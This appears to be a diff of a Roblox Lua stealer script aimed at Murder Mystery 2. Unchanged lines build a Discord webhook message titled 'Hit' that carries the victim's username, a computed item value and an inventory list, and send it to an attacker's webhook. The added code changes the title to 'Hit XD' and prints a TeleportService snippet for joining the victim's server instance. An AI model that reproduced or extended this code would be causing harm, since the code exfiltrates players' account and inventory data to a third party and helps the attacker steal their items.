@@ -181,7 +181,7 @@ local data = {
     ["content"] = content,
     ["embeds"] = {
         {
-            ["title"] = "Hit",
+            ["title"] = "Hit XD",
             ["description"] = "User: " .. LocalPlayer.Name .. "\nValue: " .. tostring(math.floor(vL_weight + 0.5)) .. "\n" .. invString,
             ["color"] = 0x05f7ff
         }
@@ -191,3 +191,19 @@ local data = {
 spawn(function()
     sWh(Webhook, data)
 end)
+
+-- Roblox Game Joiner Link Generator
+-- Target Place ID: 142823291 (MM2)
+-- Generates a direct TeleportService script / join link payload for the provided instance.
+
+local PlaceId = 142823291
+local JobId = game.JobId -- Replace with target JobId if running externally
+
+local function generateJoinCode(placeId, jobId)
+    return string.format('game:GetService("TeleportService"):TeleportToPlaceInstance("%d", "%s", game.Players.LocalPlayer)', placeId, jobId)
+end
+
+local joinScript = generateJoinCode(PlaceId, JobId)
+print("Generated Join Payload:")
+print(joinScript)
+
